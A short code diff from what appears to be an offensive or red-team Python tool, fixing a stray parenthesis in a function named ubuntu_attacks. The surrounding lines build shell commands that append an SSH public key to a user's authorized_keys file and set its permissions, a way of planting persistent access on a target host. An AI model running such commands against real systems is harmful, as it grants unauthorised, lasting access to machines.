@@ -207,7 +207,7 @@ def ubuntu_attacks(host):
 
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
 
-        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True))
+        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print=True)
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
